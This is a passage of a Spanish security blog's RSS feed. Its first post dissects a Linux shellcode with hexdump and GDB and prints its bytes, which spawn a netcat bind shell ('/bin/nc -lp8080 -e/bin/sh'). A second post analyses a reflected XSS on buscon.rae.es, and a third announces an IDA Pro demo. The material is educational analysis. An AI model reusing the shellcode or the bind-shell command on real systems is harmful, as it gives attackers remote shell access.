&lt;p&gt;Ahí es donde entra la genialidad de los diseñadores de shellcodes y lo que representa un arte y desafio. Usar instrucciones equivalentes o cuyos efectos colaterales se aprovechen para hacer más pequeño el shellcode, evitar bytes nulos o hacer el código independiente de la posición que ocupe en memoria entre otros.&lt;/p&gt;
&lt;p&gt;Más de esto en un futuro post.&lt;/p&gt;
&lt;p&gt;Volviendo al shellcode que estamos viendo, vamos a diseccionarlo:&lt;/p&gt;
&lt;p&gt;En principio este shellcode abrirá una conexión en el puerto 8080 poniendo allí a un netcat en escucha el cual ejecuta un proceso “/bin/sh” (omnipresente en cualquier unix) con la opción ‘-e’ (no siempre presente en todos los netcat). Esto nos proporcionaría una shell en el sistema atacado. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Y…¿Donde está la llamada a NetCat en el código?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Interpretada como instrucciones. Hay que tener en cuenta que un byte no dice nada por si mismo, pueden ser datos o pueden ser instrucciones. Hacer un x/i (el comando en GDB para e&lt;strong&gt;x&lt;/strong&gt;aminar &lt;strong&gt;i&lt;/strong&gt;nstrucciones) sobre una dirección cualquiera de un proceso hará que se desensamble e interprete tal como esté, a partir de esa dirección.&lt;/p&gt;
&lt;p&gt;Sin embargo si efectuamos un volcado hexadecimal podremos observar algo familiar:&lt;/p&gt;
&lt;p&gt;$ hexdump -C shellcode&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
00001070  ff 2f 62 69 6e 2f 6e 63  23 2d 6c 70 38 30 38 30  |./bin/nc#-lp8080|&lt;br&gt;
00001080  23 2d 65 2f 62 69 6e 2f  73 68 23 00 44 69 72 3a  |#-e/bin/sh#.Dir:|&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Vamos a compararlo con cierta parte del shellcode que está en el código fuente:&lt;/p&gt;
&lt;p&gt;xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\&lt;/p&gt;
&lt;p&gt;El shellcode nos ocupa la siguiente posición:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
(gdb) x/20wx shellcode&lt;br&gt;
0x804a040 &amp;lt;shellcode&amp;gt;:	0x315e2aeb	0x074688c0	0x880f4688	0x76891946&lt;br&gt;
0x804a050 &amp;lt;shellcode+16&amp;gt;:	0x085e8d1a	0x8d1e5e89	0x5e89105e	0x26468922&lt;br&gt;
0x804a060 &amp;lt;shellcode+32&amp;gt;:	0xf3890bb0	0x8d1a4e8d	0x80cd2656	0xffffd1e8&lt;br&gt;
0x804a070 &amp;lt;shellcode+48&amp;gt;:	0x69622fff	0x636e2f6e	0x706c2d23	0x30383038&lt;br&gt;
0x804a080 &amp;lt;shellcode+64&amp;gt;:	0x2f652d23	0x2f6e6962	0x00236873	0x00000000&lt;/p&gt;
&lt;p&gt;[/sourcecode]&lt;/p&gt;
&lt;p&gt;Observamos que la cadena comienza en: 0x0804a070 y le decimos a GDB que la muestre como código:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
(gdb) x/11i 0x0804a070&lt;br&gt;
   0x804a070 &amp;lt;shellcode+48&amp;gt;:	ljmp   *(%edi)&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a077 &amp;lt;shellcode+55&amp;gt;:	arpl   %sp,(%ebx)&lt;br&gt;
   0x804a079 &amp;lt;shellcode+57&amp;gt;:	sub    $0x3038706c,%eax&lt;br&gt;
   0x804a07e &amp;lt;shellcode+62&amp;gt;:	cmp    %dh,(%eax)&lt;br&gt;
   0x804a080 &amp;lt;shellcode+64&amp;gt;:	and    0x69622f65,%ebp&lt;br&gt;
   0x804a086 &amp;lt;shellcode+70&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a087 &amp;lt;shellcode+71&amp;gt;:	das&lt;br&gt;
   0x804a088 &amp;lt;shellcode+72&amp;gt;:	jae    0x804a0f2&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Como podemos observar no guarda ningún sentido porque son lo que son: datos.&lt;/p&gt;
&lt;p&gt;Bueno, como esto está quedando un poco largo voy a dejar lo siguiente, el paso a paso del shellcode, en un siguiente post.&lt;/p&gt;
</description><category>Basic</category><category>gdb</category><category>seguridad</category><category>shellcode</category><guid>http://deibit.com/posts/2011/01/19/analizando-un-shellcode-i/</guid><pubDate>Wed, 19 Jan 2011 17:25:11 GMT</pubDate></item><item><title>XSS en buscon.rae.es</title><link>http://deibit.com/posts/2011/01/03/xss-en-buscon-rae-es/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Vía un amigo me han pasado un XSS bastante cachondo. Ignoro si la masa mediática ha pasado por encima de él pero huele a carnaza ripia. Sin más:&lt;br&gt;
&lt;br&gt;&lt;br&gt;
&lt;a href="http://daganu.files.wordpress.com/2011/01/xss1.png"&gt;&lt;img src="http://daganu.files.wordpress.com/2011/01/xss1.png?w=300" alt="" title="xss1" width="300" height="179" class="aligncenter size-medium wp-image-115"&gt;&lt;/a&gt;&lt;br&gt;
&lt;br&gt;&lt;br&gt;
No, no han “atacado” el servidor ni lo han “defaceado”. Se trata de un XSS no persistente que inyecta en un marco HTML procedente de un servidor externo, cuyo código usa como hojas de estilo (CSS) las propias del sitio de la rae para darle “autenticidad”.&lt;br&gt;
&lt;br&gt;&lt;br&gt;
Captura del resultado de dos tipos de peticiones, arriba una petición sin payload y abajo la que si lo lleva.&lt;br&gt;
&lt;br&gt;&lt;br&gt;
 &lt;a href="http://daganu.files.wordpress.com/2011/01/xss3.png"&gt;&lt;img src="http://daganu.files.wordpress.com/2011/01/xss3.png?w=300" alt="" title="xss3" width="300" height="173" class="aligncenter size-medium wp-image-116"&gt;&lt;/a&gt;&lt;br&gt;
&lt;br&gt;&lt;br&gt;
Poco que añadir. El parámetro ‘LEMA’ no es filtrado adecuadamente (¿se quedaron sólo en &amp;amp;tl &amp;amp;gt?) y en la petición con payload puede verse como se hace uso del DOM para modificar la propiedad ‘location’ de un formulario incrustando HTML externo desde el dominio http://leysinde.110mb.com. Un hosting gratuito.&lt;br&gt;
&lt;br&gt;&lt;br&gt;
El código incrustado, ya por curiosidad:&lt;br&gt;
&lt;br&gt;&lt;br&gt;
&lt;a href="http://daganu.files.wordpress.com/2011/01/xss2.png"&gt;&lt;img src="http://daganu.files.wordpress.com/2011/01/xss2.png?w=300" alt="" title="xss2" width="300" height="179" class="aligncenter size-medium wp-image-118"&gt;&lt;/a&gt;&lt;br&gt;
&lt;br&gt;&lt;br&gt;
Me llamó la atención el .js http://cdn.viglink.com/api/vglnk.js lo interpreta y sale. Si ves el código desde el navegador no verás nada. Pero si tiras de wget no lo interpreta y:&lt;br&gt;
&lt;br&gt;&lt;br&gt;
&lt;a href="http://daganu.files.wordpress.com/2011/01/xss4.jpg"&gt;&lt;img src="http://daganu.files.wordpress.com/2011/01/xss4.jpg?w=300" alt="" title="xss4" width="300" height="288" class="aligncenter size-medium wp-image-119"&gt;&lt;/a&gt;&lt;br&gt;
&lt;br&gt;&lt;br&gt;
Es un script que te mete 110mb.com para echarle un ojo a los números de tu sitio :D ¡Menuda desilusión!&lt;/p&gt;
</description><category>Analysis</category><category>seguridad</category><category>vulnerabilidad</category><category>xss</category><guid>http://deibit.com/posts/2011/01/03/xss-en-buscon-rae-es/</guid><pubDate>Mon, 03 Jan 2011 20:28:19 GMT</pubDate></item><item><title>Ya se puede probar la versión demo de IDA Pro 6</title><link>http://deibit.com/posts/2010/11/30/ya-se-puede-probar-la-version-demo-de-ida-pro-6/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Desde la página oficial, se puede &lt;a href="http://www.hex-rays.com/idapro/idadowndemo.htm"&gt;descargar&lt;/a&gt; una versión demo de la nueva versión de IDA.&lt;br&gt;
La característica estrella, sin duda, es la nueva interfaz gráfica basada en las librerías Qt. Una currada de Daniel Pistelli.&lt;/p&gt;
&lt;p&gt;No obstante el nuevo IDA también trae la antigua interfaz, algo que facilitará a los antiguos usuarios la transición.&lt;/p&gt;
&lt;p&gt;Una fotillo (versión Mac):&lt;/p&gt;
&lt;div class="separator" style="clear:both;text-align:center;"&gt;&lt;a style="margin-left:1em;margin-right:1em;" href="http://daganu.files.wordpress.com/2010/11/ida41.jpg"&gt;&lt;img src="http://daganu.files.wordpress.com/2010/11/ida41.jpg?w=300" border="0" alt="" width="320" height="229"&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div class="separator" style="clear:both;text-align:center;"&gt;&lt;/div&gt;
&lt;div class="separator" style="clear:both;text-align:center;"&gt;&lt;/div&gt;
&lt;div class="separator" style="clear:both;text-align:center;"&gt;&lt;/div&gt;
</description><category>ida</category><category>qt</category><category>reversing</category><category>seguridad</category><guid>http://deibit.com/posts/2010/11/30/ya-se-puede-probar-la-version-demo-de-ida-pro-6/</guid><pubDate>Tue, 30 Nov 2010 18:42:00 GMT</pubDate></item></channel></rss>